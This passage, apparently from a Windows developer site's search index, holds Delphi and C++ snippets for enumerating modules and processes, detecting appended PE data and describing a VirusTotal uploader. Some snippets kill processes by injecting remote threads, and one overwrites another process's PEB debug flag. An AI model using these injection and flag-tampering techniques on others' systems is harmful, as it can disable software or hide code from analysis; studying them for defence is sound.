API CreateToolHelp32Snapshot(), I will cover additional methods soon.\nYou may notice that when using CreateToolHelp32Snapshot(), first result (row) is generally the Image Path of the process owning module. I ignore that row by checking the value of szExePath with owner process image path.\nGetProcessName() is compatible since Windows Vista. It is possible to support Windows XP and below but not in this example.\nYou will find GetProcessName() and alternatives in separated snippets threads.\n(******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ License: -\u0026gt; MIT *******************************************************************************) unit UntEnumModules; interface uses Classes, Windows, tlHelp32, SysUtils, Generics.Collections, psAPI; function EnumModules(ATargetProcessID : Cardinal) : TList\u0026lt;TModuleEntry32\u0026gt;; implementation {------------------------------------------------------------------------------- One possible method to get process image path from process id. Doesn't support Windows XP and below, Windows XP is dead :-( - One technique would be to use GetModuleFileNameExW() -------------------------------------------------------------------------------} function GetProcessName(AProcessID : Cardinal) : String; var hProc : THandle; ALength : DWORD; hDLL : THandle; QueryFullProcessImageNameW : function( AProcess: THANDLE; AFlags: DWORD; AFileName: PWideChar; var ASize: DWORD): BOOL; stdcall; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// if (TOSVersion.Major \u0026lt; 6) then Exit(); /// QueryFullProcessImageNameW := nil; hDLL := LoadLibrary('kernel32.dll'); if hDLL = 0 then Exit(); try @QueryFullProcessImageNameW := GetProcAddress(hDLL, 'QueryFullProcessImageNameW'); /// if Assigned(QueryFullProcessImageNameW) then begin hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessID); if hProc = 0 then exit; try ALength := (MAX_PATH * 2); SetLength(result, ALength); if NOT QueryFullProcessImageNameW(hProc, 0, @result[1], ALength) then Exit(); SetLength(result, ALength); // Get rid of extra junk finally CloseHandle(hProc); end; end; finally FreeLibrary(hDLL); end; end; { Enumerate target process modules (Loaded DLL's) } function EnumModules(ATargetProcessID : Cardinal) : TList\u0026lt;TModuleEntry32\u0026gt;; var ASnap : THandle; AModuleEntry : TModuleEntry32; AOwnerPath : String; const TH32CS_SNAPMODULE32 = $00000010; procedure Append(); begin if AOwnerPath.ToLower = String(AModuleEntry.szExePath).ToLower then Exit(); // Ignore result.Add(AModuleEntry); end; begin result := TList\u0026lt;TModuleEntry32\u0026gt;.Create(); /// AOwnerPath := GetProcessName(ATargetProcessId); ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPMODULE or TH32CS_SNAPMODULE32, ATargetProcessId); if ASnap = INVALID_HANDLE_VALUE then begin Exit; end; try ZeroMemory(@AModuleEntry, SizeOf(TModuleEntry32)); AModuleEntry.dwSize := SizeOf(TModuleEntry32); /// if NOT Module32First(ASnap, AModuleEntry) then begin Exit(); end; Append(); while True do begin ZeroMemory(@AModuleEntry, SizeOf(TModuleEntry32)); AModuleEntry.dwSize := SizeOf(TModuleEntry32); /// if NOT Module32Next(ASnap, AModuleEntry) then begin Break; end; Append(); end; finally CloseHandle(ASnap); end; end; end. "});index.add({'id':23,'href':'/docs/windows/snippets/delphi/terminate-process-techniques/','title':"Terminate Process Techniques",'content':"You will find below 4 different techniques to close/kill/terminate Windows process in pure WinAPI.\nTechniques  TerminateProcess() : Classic method. ExitProcess() : via Code Injection (32bit to 32bit ; 64bit to 64bit). Crash Process : Inject code that will crash the process (32bit to 32bit ; 64bit to 64bit). CTRL_CLOSE_EVENT / WM_CLOSE : Send \u0026ldquo;close\u0026rdquo; messages to target process windows.  TerminateAProcess() Method Kill target process id following desired method : tmpAll, tpmTerminateProcess, tpmExitProcess, tpmCrash, tpmMessage\ntmpAll attempt to kill process from cleanest way to dirtiest way until it succeed.\nCode { Jean-Pierre LESUEUR (@DarkCoderSc) } /// ... uses Windows, SysUtils, tlhelp32; /// ... type TTerminateProcessMethod = ( tmpAll, tpmTerminateProcess, tpmExitProcess, tpmCrash, tpmMessage ); { Detect if a process id exists using the CreateToolHelp32Snapshot method from tlhelp32 lib. } function TLHelp32_ProcessIdExists(AProcessId : Cardinal) : Boolean; var ASnapshot : THandle; AProcessEntry : TProcessEntry32; begin result := false; /// ASnapshot := CreateToolHelp32Snapshot(TH32CS_SNAPALL, 0); if ASnapshot = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AProcessEntry, sizeOf(TProcessEntry32)); AProcessEntry.dwSize := sizeOf(TProcessEntry32); if NOT Process32First(ASnapshot, AProcessEntry) then Exit(); if (AProcessId = AProcessEntry.th32ProcessID) then begin result := true; end else begin while true do begin ZeroMemory(@AProcessEntry, sizeOf(TProcessEntry32)); AProcessEntry.dwSize := sizeOf(TProcessEntry32); if NOT Process32Next(ASnapshot, AProcessEntry) then break; if (AProcessId = AProcessEntry.th32ProcessID) then begin result := true; break; end; end; end; finally CloseHandle(ASnapshot); end; end; { Method 1 : Terminate a process through TerminateProcess API. IMOO the cleanest way if it isn't a graphical application. } function TerminateProcess_TerminateProcess(AProcessID : Cardinal) : Boolean; var hProc : THandle; begin result := false; hProc := OpenProcess(PROCESS_TERMINATE, false, AProcessID); if (hProc = 0) then Exit(); try if NOT WinAPI.Windows.TerminateProcess(hProc, 0) then Exit(); result := true; finally CloseHandle(hProc); end; end; { Method 2 : Terminate Process through code injection on target process. This method works if both process (injecter and target) are using same process architecture. } function TerminateProcess_ExitProcess(AProcessID : Cardinal) : Boolean; var hProc : THandle; pExitProcess : Pointer; hRemoteThread : THandle; dwThreadId : Cardinal; Arg : Integer; begin result := false; /// SetLastError(0); pExitProcess := GetProcAddress(LoadLibrary('kernel32.dll'), 'ExitProcess'); if (GetLastError() \u0026lt;\u0026gt; 0) then begin exit; end; hProc := OpenProcess(PROCESS_CREATE_THREAD or PROCESS_VM_OPERATION or PROCESS_VM_WRITE, false, AProcessID); if (hProc = 0) then Exit(); try Arg := 0; // EXIT VALUE hRemoteThread := CreateRemoteThread(hProc, nil, 0, pExitProcess, @Arg, 0, dwThreadId); if (hRemoteThread = 0) then Exit(); WaitForSingleObject(hRemoteThread, INFINITE); // WAIT UNTIL REMOTE THREAD HAS END result := true; finally CloseHandle(hProc); end; end; { Method 3 : Terminate process by crashing target process with an access violation. This is not a recommended solution but still worth testing. } function TerminateProcess_Crash(AProcessID : Cardinal) : Boolean; var hProc : THandle; dwThreadId : Cardinal; hRemoteThread : THandle; begin hProc := OpenProcess(PROCESS_CREATE_THREAD or PROCESS_VM_OPERATION or PROCESS_VM_WRITE, false, AProcessID); if (hProc = 0) then Exit; try hRemoteThread := CreateRemoteThread(hProc, nil, 0, Pointer(-1), nil, 0, dwThreadId); if (hRemoteThread = 0) then Exit(); result := true; finally CloseHandle(hProc); end; end; { Method 4 : Terminate process via sending close event messages. IMOO the best method for process with GUI. } function _EnumWindowProc(AHwnd : HWND; param : LParam): BOOL; stdcall; var AProcessID : Cardinal; begin result := true; /// if AHwnd = 0 then Exit(); GetWindowThreadProcessId(AHwnd, @AProcessID); if PCardinal(param)^ \u0026lt;\u0026gt; AProcessID then Exit(); SendMessage(AHwnd, CTRL_CLOSE_EVENT, 0, 0); SendMessage(AHwnd, WM_CLOSE, 0, 0); end; function TerminateProcess_SendMessage(AProcessID : Cardinal) : boolean; begin result := false; /// SetLastError(0); if NOT EnumWindows(@_EnumWindowProc, LPARAM(@AProcessID)) then begin exit; end; if TLHelp32_ProcessIdExists(AProcessID) then Exit; /// result := true; end; { Dispatach desired terminate process method. } function TerminateProcess(AProcessID : Cardinal; AMethod : TTerminateProcessMethod = tpmTerminateProcess) : Boolean; begin result := false; /// if NOT TLHelp32_ProcessIdExists(AProcessID) then Exit(); case AMethod of tmpAll : begin TerminateProcess_SendMessage(AProcessID); if NOT result then TerminateProcess_TerminateProcess(AProcessID); if NOT result then TerminateProcess_ExitProcess(AProcessID); if NOT result then TerminateProcess_Crash(AProcessID); end; tpmTerminateProcess : result := TerminateProcess_TerminateProcess(AProcessID); tpmExitProcess : result := TerminateProcess_ExitProcess(AProcessID); tpmCrash : result := TerminateProcess_Crash(AProcessID); tpmMessage : result := TerminateProcess_SendMessage(AProcessID); end; end; "});index.add({'id':24,'href':'/docs/windows/projects/opensource/update-peb-debug-delphi/','title':"Update PEB Debug Flag (Delphi)",'content':"This project implement the unit UntPEBDebug.pas with a concreate example.\nFeatures Include  List process and their Debug status. (ReadProcessMemory / PEB method) Update process Debug flag. (WriteProcessMemory / PEB method) Support both 32bit and 64bit. Notice.  Notice regarding architecture:\n To target 32bit process, you must use the project compiled as 32bit executable. To target 64bit process, you must use the project compiled as 64bit executable.  Repository git clone https://github.com/DarkCoderSc/peb-update-debug-flag.git\nProject available at : https://github.com/DarkCoderSc/peb-update-debug-flag\nScreenshot Main Code Preview (******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ License: -\u0026gt; MIT *******************************************************************************) program PEBDebug; {$APPTYPE CONSOLE} {$R *.res} uses System.SysUtils, Windows, tlHelp32, Generics.Collections, UntPEBDebug in 'UntPEBDebug.pas'; type TArchitecture = (x86, x64, xUnknown); { Detect target process architecture. } function IsProcessX64(AProcessId : Cardinal) : TArchitecture; var AProcHandle : THandle; AWow64Process : bool; begin result := xUnknown; /// { If we are not in a 64Bit system then we are for sure in a 32Bit system } if (TOSVersion.Architecture = arIntelX86) then Exit(); /// AProcHandle := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, AProcessId); if AProcHandle = 0 then Exit; try isWow64Process(AProcHandle, AWow64Process); /// if AWow64Process then result := x86 else result := x64; finally CloseHandle(AProcHandle); end; end; { Retrieve the list of running process for scanning PEB value. } function EnumProcess(AFilterSameArch : Boolean = False) : TDictionary\u0026lt;Integer {Process Id}, String {Process Name}\u0026gt;; var ASnap : THandle; AProcessEntry : TProcessEntry32; AProcessName : String; procedure AppendEntry(); begin if AFilterSameArch and ((IsProcessX64(GetCurrentProcessId())) \u0026lt;\u0026gt; (IsProcessX64(AProcessEntry.th32ProcessID))) then Exit(); /// result.Add(AProcessEntry.th32ProcessID, AProcessEntry.szExeFile); end; begin result := TDictionary\u0026lt;Integer, String\u0026gt;.Create(); /// ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0); if ASnap = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32First(ASnap, AProcessEntry) then Exit(); AppendEntry(); while True do begin ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32Next(ASnap, AProcessEntry) then break; AppendEntry(); end; finally CloseHandle(ASnap); end; end; { Display Process Debug Status Feature. } procedure DoListProcessDebugStatus(); var ADebugStatus : Boolean; AProcessName : String; AProcessId : Cardinal; AProcessList : TDictionary\u0026lt;Integer, String\u0026gt;; ADebugStatusStr : String; begin WriteLn('Process List (Only with same architecture) :'); /// AProcessList := EnumProcess(True); try for AProcessId in AProcessList.Keys do begin if NOT AProcessList.TryGetValue(AProcessId, AProcessName) then continue; /// if GetProcessDebugStatus(AProcessId, ADebugStatus) then begin if ADebugStatus then ADebugStatusStr := 'True' else ADebugStatusStr := 'False'; writeln(#09 + Format('* Debug=[%s], %s(%d)', [ADebugStatusStr, AProcessName, AProcessId])); end; end; finally if Assigned(AProcessList) then FreeAndNil(AProcessList); end; Writeln(#13#10); end; { Show different option of that tool } function DisplayMenu() : Integer; var AChoice : String; begin result := 0; /// WriteLn('Choose an option:'); WriteLn('--------------------------------------------' + #13#10); WriteLn(#09 + '* [1] : List process debug flag'); WriteLn(#09 + '* [2] : Set process debug flag to true'); WriteLn(#09 + '* [3] : Set process debug flag to false'); WriteLn(#09 + '* [4] : Quit'); Writeln(#13#10); Write('Option : '); ReadLn(AChoice); Writeln(#13#10); if NOT TryStrToInt(AChoice, result) then result := 0; end; { Update Target Process Debug Flag } procedure UpdateTargetProcessDebugFlag(ADebugStatus : Boolean); var AChoice : String; AProcessId : Integer; begin Write('Enter target process id :'); ReadLn(AChoice); if NOT TryStrToInt(AChoice, AProcessId) then WriteLn('Invalid Process Id') else begin if AProcessId \u0026lt;= 0 then WriteLn('Invalid Process Id') else begin if SetProcessDebugStatus(AProcessId, ADebugStatus) then begin WriteLn('Done.'); end else begin WriteLn('Failed. Possible reasons: \u0026quot;Non existing process id\u0026quot;, \u0026quot;Not enough privilege\u0026quot;, \u0026quot;Wrong architecture\u0026quot;'); end; end; end; WriteLn(''); end; var AChoice : Byte; begin try while True do begin AChoice := DisplayMenu(); /// case AChoice of 1 : begin DoListProcessDebugStatus(); end; 2 : begin UpdateTargetProcessDebugFlag(True); end; 3 : begin UpdateTargetProcessDebugFlag(False); end; 4 : begin Break; end; end; end; except on E: Exception do Writeln(E.ClassName, ': ', E.Message); end; end. "});index.add({'id':25,'href':'/docs/windows/snippets/delphi/update-peb-debug/','title':"Update PEB Debug Flag",'content':"Tiny delphi unit to get and update debug flag from PEB (Process Environment Block).\nThis unit was created while working on a friend project called Unprotect (@fr0gger_), https://github.com/fr0gger/unprotect\nIndeed, some Malware often check the value of Debug flag to know whether or not they are getting debugged and apply anti debug techniques if this is the case.\nExample of implementation can be found there\n(******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ License: -\u0026gt; MIT *******************************************************************************) unit UntPEBDebug; interface uses Windows; const PROCESS_QUERY_LIMITED_INFORMATION = $1000; PROCESS_BASIC_INFORMATION = 0; // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess var _NtQueryInformationProcess : function( ProcessHandle : THandle; ProcessInformationClass : DWORD; ProcessInformation : Pointer; ProcessInformationLength : ULONG; ReturnLength : PULONG) : LongInt; stdcall; hNTDLL : THandle; {$IFDEF WIN64} type PProcessBasicInformation = ^TProcessBasicInformation; TProcessBasicInformation = record ExitStatus : Int64; PebBaseAddress : Pointer; AffinityMask : Int64; BasePriority : Int64; UniqueProcessId : Int64; InheritedUniquePID : Int64; end; {$ELSE} type PProcessBasicInformation = ^TProcessBasicInformation; TProcessBasicInformation = record ExitStatus : DWORD; PebBaseAddress : Pointer; AffinityMask : DWORD; BasePriority : DWORD; UniqueProcessId : DWORD; InheritedUniquePID : DWORD; end; {$ENDIF} function GetProcessDebugStatus(AProcessID : Cardinal; var ADebugStatus : boolean) : Boolean; function SetProcessDebugStatus(AProcessID : Cardinal; ADebugStatus : Boolean) : Boolean; implementation {------------------------------------------------------------------------------- Open a process and retrieve the point of debug flag from PEB. If function succeed, don't forget to call close process handle. -------------------------------------------------------------------------------} function GetDebugFlagPointer(AProcessID : Cardinal; var AProcessHandle : THandle) : Pointer; var PBI : TProcessBasicInformation; ARetLen : Cardinal; begin result := nil; /// AProcessHandle := 0; if NOT Assigned(_NtQueryInformationProcess) then Exit(); /// AProcessHandle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_WRITE or PROCESS_VM_READ, false, AProcessID); if (AProcessHandle = 0) then Exit; if _NtQueryInformationProcess(AProcessHandle, PROCESS_BASIC_INFORMATION, @PBI, sizeOf(TProcessBasicInformation), @ARetLen) = ERROR_SUCCESS then result := Pointer(NativeUInt(PBI.PebBaseAddress) + (SizeOf(Byte) * 2)) else CloseHandle(AProcessHandle); end; {------------------------------------------------------------------------------- Retrieve the target process debug status from PEB. ADebugStatus = True : Target process debug flag is set. ADebugStatus = False : Target process debug flag is not set. -------------------------------------------------------------------------------} function GetProcessDebugStatus(AProcessID : Cardinal; var ADebugStatus : boolean) : Boolean; var hProcess : THandle; pDebugFlagOffset : Pointer; pDebugFlag : pByte; ABytesRead : SIZE_T; begin result := false; /// pDebugFlagOffset := GetDebugFlagPointer(AProcessID, hProcess); if not Assigned(pDebugFlagOffset) then Exit(); /// try getMem(pDebugFlag, sizeOf(Byte)); try if NOT ReadProcessMemory(hProcess, pDebugFlagOffset, pDebugFlag, sizeOf(Byte), ABytesRead) then Exit; /// ADebugStatus := (pDebugFlag^ = 1); finally FreeMem(pDebugFlag); end; /// result := (ABytesRead = SizeOf(Byte)); finally CloseHandle(hProcess); end; end; {------------------------------------------------------------------------------- Update target process debug flag. ADebugStatus = True : Set target process debug flag. ADebugStatus = False : Unset target process debug flag. -------------------------------------------------------------------------------} function SetProcessDebugStatus(AProcessID : Cardinal; ADebugStatus : Boolean) : Boolean; var hProcess : THandle; pDebugFlagOffset : Pointer; ADebugFlag : Byte; ABytesWritten : SIZE_T; begin result := false; /// pDebugFlagOffset := GetDebugFlagPointer(AProcessID, hProcess); if not Assigned(pDebugFlagOffset) then Exit(); /// try if ADebugStatus then ADebugFlag := 1 else ADebugFlag := 0; if NOT WriteProcessMemory(hProcess, pDebugFlagOffset, @ADebugFlag, SizeOf(Byte), ABytesWritten) then Exit; /// result := (ABytesWritten = SizeOf(Byte)); finally CloseHandle(hProcess); end; end; initialization { Load NtQueryInformationProcess from NTDLL.dll } _NtQueryInformationProcess := nil; hNTDLL := LoadLibrary('ntdll.dll'); if (hNTDLL \u0026lt;\u0026gt; 0) then @_NtQueryInformationProcess := GetProcAddress(hNTDLL, 'NtQueryInformationProcess'); finalization _NtQueryInformationProcess := nil; if (hNTDLL \u0026lt;\u0026gt; 0) then FreeLibrary(hNTDLL); end. ````"});index.add({'id':26,'href':'/docs/windows/snippets/delphi/enum-process-method-1/','title':"Enum Process Method 1",'content':"This is one of the most famous method to enumerate running process on Windows.\nIf AFilterSameArch is set to True, only processes running with same architecture as current process will be listed.\n{ Jean-Pierre LESUEUR (@DarkCoderSc) Example: ... var AProcessName : String; AProcessId : Cardinal; AProcessList : TDictionary\u0026lt;Integer, String\u0026gt;; begin AProcessList := EnumProcess(True); try for AProcessId in AProcessList.Keys do begin if NOT AProcessList.TryGetValue(AProcessId, AProcessName) then continue; /// ... end; finally if Assigned(AProcessList) then FreeAndNil(AProcessList); end; end; } //... uses tlhelp32, SysUtils, Windows, Generics.Collections; //... function EnumProcess(AFilterSameArch : Boolean = False) : TDictionary\u0026lt;Integer {Process Id}, String {Process Name}\u0026gt;; var ASnap : THandle; AProcessEntry : TProcessEntry32; AProcessName : String; procedure AppendEntry(); begin if AFilterSameArch and ((IsProcessX64(GetCurrentProcessId())) \u0026lt;\u0026gt; (IsProcessX64(AProcessEntry.th32ProcessID))) then Exit(); /// result.Add(AProcessEntry.th32ProcessID, AProcessEntry.szExeFile); end; begin result := TDictionary\u0026lt;Integer, String\u0026gt;.Create(); /// ASnap := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0); if ASnap = INVALID_HANDLE_VALUE then Exit(); try ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32First(ASnap, AProcessEntry) then Exit(); AppendEntry(); while True do begin ZeroMemory(@AProcessEntry, SizeOf(TProcessEntry32)); /// AProcessEntry.dwSize := SizeOf(TProcessEntry32); if NOT Process32Next(ASnap, AProcessEntry) then break; AppendEntry(); end; finally CloseHandle(ASnap); end; end; "});index.add({'id':27,'href':'/docs/windows/snippets/delphi/is-process-64/','title':"Is Process 64bit",'content':"Tiny snippet to know whether or not target process id is running under 32bit or 64bit architecture.\nIf result is True, target process is running under 64bit architecture.\nIf result is False, target process is running under 32bit architecture.\n// // Jean-Pierre LESUEUR @DarkCoderSc // // ... uses Windows, SysUtils; // ... type TArchitecture = (x86, x64, xUnknown); // ... function IsProcessX64(AProcessId : Cardinal) : TArchitecture; var AProcHandle : THandle; AWow64Process : bool; begin result := xUnknown; /// { If we are not in a 64Bit system then we are for sure in a 32Bit system } if (TOSVersion.Architecture = arIntelX86) then Exit(); /// AProcHandle := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, AProcessId); if AProcHandle = 0 then Exit; try isWow64Process(AProcHandle, AWow64Process); /// if AWow64Process then result := x86 else result := x64; finally CloseHandle(AProcHandle); end; end; "});index.add({'id':28,'href':'/docs/windows/projects/freeware/','title':"Freeware",'content':"Freeware Section   Winja (VirusTotal Uploader) - Binary  "});index.add({'id':29,'href':'/docs/windows/projects/freeware/winja/','title':"Winja (VirusTotal Uploader) - Binary",'content':"Winja is a free application for Microsoft Windows that lets you find potential malware on your system. It uses the scanning engine of virtually all antivirus products in the market to give you a very precise idea of the risk posed by a particular file.\nTwo concrete examples of using Winja:  You have downloaded a file from the Internet, you want to remove as many doubts as possible. Drag this file onto the main window and wait for the results that will appear on your desktop. You suspect your computer is infected. Scan all services and processes for malware.  To do this, Winja first uses the VirusTotal public API to submit the fingerprint of a file. If this fingerprint exists, Winja returns the existing analysis report. If not (with your previously set permission), Winja sends the unknown file to VirusTotal servers for scanning. It is also possible for you to have files (called samples) analyzed again at any time to update the detection ratio.\nWinja lets you, very simply and quickly, find suspicious files in places favored by malware:  Active Processes Processes that use network resources (that connect to the Internet) Services Applications that start with Windows Task Scheduler  You can also easily drag and drop files to the main Winja window or to the desktop gadget to scan them.\nThe final example of scanning is the use of an extension for Windows Explorer that allows you to request a scan by right-clicking on one or more files from your file browser.\nSince version 6, Winja is available in French following strong demand from the French-speaking community.\nWinja is cited and recommended by VirusTotal (a subsidiary of Google) as an alternative to their own desktop application for Windows: https://support.virustotal.com/hc/en-us/articles/115002179065-Desktop-apps\nFor our part, as well as theirs, we make sure that this application is a complement to your favorite antivirus and does not put at risk the antivirus brands that lend us their signatures free of charge.\nFor this reason, Winja remains a passive analysis tool and is not a substitute for the installation and use of an antivirus software.\n Download  "});index.add({'id':30,'href':'/docs/windows/projects/opensource/eof-reader/','title':"EOF Reader (C++)",'content':"EOF Reader is a tiny Visual C++ project designed to detect the presence of EOF (End Of File) data on both 32bit and 64bit valid Portable Executable Files.\nAfter creating a similar project in Pascal/Delphi, I decided to port the code in C++.\nSome Antivirus Software using similar technique to flag some Malware generically. There are very few if no legitimate reason at all to append data at the end of a PE File.\nFeatures (Support both 32bit and 64bit PE Files)  Detect presence of EOF Data from valid PE Files. If present, dump EOF Data to console. Possibility to write extracted EOF Data to file.  Get the project code git clone https://github.com/DarkCoderSc/eof-reader.git\nSuccessfully compiled with Visual Studio 2019.\nMain source file /* ----------------------------------------------------------------------------- Jean-Pierre LESUEUR (@DarkCoderSc) jplesueur@phrozen.io License : MIT Read EOF (End Of File) Data from PE File. Based on my previous work : https://github.com/DarkCoderSc/peof-detector/blob/master/UntEOF.pas Compiled with : Visual Studio 2019 (Community) Notice : If you have any advices for improving the code or if you have any issues, feel free to contact me.\tC++ is not yet my main language, always willing to learn ;-) ----------------------------------------------------------------------------- */ #include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; #include \u0026quot;windows.h\u0026quot; #include \u0026lt;iomanip\u0026gt; #include \u0026lt;sstream\u0026gt; #include \u0026quot;termcolor/termcolor.hpp\u0026quot; using namespace std; /* Log functions */ void log_error(const string \u0026amp;message) { cerr \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; termcolor::bloodred \u0026lt;\u0026lt; \u0026quot;x\u0026quot; \u0026lt;\u0026lt; termcolor::reset \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; message \u0026lt;\u0026lt; endl; } void log_debug(const string \u0026amp;message) { cout \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; \u0026quot;*\u0026quot; \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; message \u0026lt;\u0026lt; endl; } void log_success(const string \u0026amp;message) { cout \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; termcolor::lime \u0026lt;\u0026lt; \u0026quot;*\u0026quot; \u0026lt;\u0026lt; termcolor::reset \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; message \u0026lt;\u0026lt; endl; } void log_warn(const string \u0026amp;message = \u0026quot;\u0026quot;) { cout \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; termcolor::yellow \u0026lt;\u0026lt; \u0026quot;!\u0026quot; \u0026lt;\u0026lt; termcolor::reset \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; message \u0026lt;\u0026lt; endl; } /* Dump memory data to console. */ void HexDumpBufferToConsole(PVOID pBuffer, __int64 ABufferSize) { cout \u0026lt;\u0026lt; \u0026quot;| ------------------------------------------------|------------------|\u0026quot; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026quot;| 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | |\u0026quot; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026quot;| ------------------------------------------------|------------------|\u0026quot; \u0026lt;\u0026lt; endl; for (int j = 0; j \u0026lt; ceil(ABufferSize / 16); j++) { char AsciiColumns[17]; stringstream ARow; for (int i = 0; i \u0026lt; 16; i++) { unsigned char AChar = ((char*)pBuffer)[(j * 16) + i]; if (!isprint(AChar)) { AChar = 46; // . } ARow \u0026lt;\u0026lt; setfill('0') \u0026lt;\u0026lt; setw(2) \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; static_cast\u0026lt;unsigned int\u0026gt;(AChar) \u0026lt;\u0026lt; \u0026quot; \u0026quot;; AsciiColumns[i] = AChar; } AsciiColumns[16] = 0; // Add null terminated character. cout \u0026lt;\u0026lt; \u0026quot;| \u0026quot; \u0026lt;\u0026lt; ARow.rdbuf() \u0026lt;\u0026lt; \u0026quot;| \u0026quot; \u0026lt;\u0026lt; AsciiColumns \u0026lt;\u0026lt; \u0026quot; |\u0026quot; \u0026lt;\u0026lt; endl; } cout \u0026lt;\u0026lt; \u0026quot;| ------------------------------------------------|------------------|\u0026quot; \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; endl; } /* Dump memory data to file. */ bool WriteBufferToFile(PVOID pBuffer, __int64 ABufferSize, wstring ADestFile, PDWORD AErrorCode) { SetLastError(0); HANDLE hFile = CreateFile(ADestFile.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); if (hFile == INVALID_HANDLE_VALUE) { *AErrorCode = GetLastError(); return false; } DWORD dwBytesWritten = 0; if (!WriteFile(hFile, pBuffer, ABufferSize, \u0026amp;dwBytesWritten, nullptr)) { *AErrorCode = GetLastError(); CloseHandle(hFile); return false; } CloseHandle(hFile); return true; } /* Basic way to read file size from disk */ __int64 GetFileSize(wchar_t AFileName[MAX_PATH]) { LARGE_INTEGER AFileSize; AFileSize.LowPart = 0; AFileSize.HighPart = 0; ifstream ifile(AFileName); if (ifile) {\tWIN32_FILE_ATTRIBUTE_DATA lpFileInfo; if (GetFileAttributesExW(AFileName, GetFileExInfoStandard, \u0026amp;lpFileInfo)) {\tAFileSize.HighPart = lpFileInfo.nFileSizeHigh; AFileSize.LowPart = lpFileInfo.nFileSizeLow; } } return AFileSize.QuadPart; } int main(int argc, char* argv[]) { if (argc != 2) { cout \u0026lt;\u0026lt; \u0026quot;Usage : readeof.exe \\\u0026quot;C:\\\\suspicious.exe\\\u0026quot;\u0026quot; \u0026lt;\u0026lt; endl; return 0; } wchar_t AFileName[MAX_PATH] = { 0 }; for (int i = 0; i \u0026lt; strlen(argv[1]); i++) { AFileName[i] = argv[1][i]; } //GetModuleFileNameW(0, AFileName, MAX_PATH);\twcout \u0026lt;\u0026lt; \u0026quot;Working on \\\u0026quot;\u0026quot; \u0026lt;\u0026lt; AFileName \u0026lt;\u0026lt; \u0026quot;\\\u0026quot; : \u0026quot; \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; endl; /* Get target file size on disk. */ __int64 AFileSize = GetFileSize(AFileName); if (AFileSize \u0026lt;= 0) { log_error(\u0026quot;Could not get target file size on disk. Abort.\u0026quot;); return 0; } log_success(\u0026quot;File size on disk : \u0026quot; + to_string(AFileSize) + \u0026quot; bytes\u0026quot;); /* Now we will compare with image size described by the PE Header. */ DWORD dwBytesRead = 0;\tHANDLE hFile = CreateFile(AFileName, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, 0); if (hFile == INVALID_HANDLE_VALUE) { log_error(\u0026quot;Could not open target file.\u0026quot;); return 0; } SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);\t/* Read IMAGE_DOS_HEADER */ IMAGE_DOS_HEADER AImageDosHeader; if (!ReadFile(hFile, \u0026amp;AImageDosHeader, sizeof(IMAGE_DOS_HEADER), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read IMAGE_DOS_HEADER.\u0026quot;); CloseHandle(hFile); return 0; } if (AImageDosHeader.e_magic != IMAGE_DOS_SIGNATURE) { log_error(\u0026quot;Not a valid PE File.\u0026quot;); CloseHandle(hFile); return 0; } SetFilePointer(hFile, AImageDosHeader.e_lfanew, nullptr, FILE_BEGIN); /* Verify if if we match IMAGE_NT_SIGNATURE (0x4550) */ DWORD AImageNTSignature; if (!ReadFile(hFile, \u0026amp;AImageNTSignature, sizeof(DWORD), \u0026amp;dwBytesRead, nullptr)) { log_error(\u0026quot;Could not read IMAGE_NT_SIGNATURE.\u0026quot;); CloseHandle(hFile); return 0; } if (AImageNTSignature != IMAGE_NT_SIGNATURE) { log_error(\u0026quot;IMAGE_NT_SIGNATURE Doesn't match.\u0026quot;); CloseHandle(hFile); return 0; } log_success(\u0026quot;The file is likely a valid PE File.\u0026quot;); /* At this point, we are enough sure we are facing a valid PE File. Reading IMAGE_FILE_HEADER */ IMAGE_FILE_HEADER AImageFileHeader; if 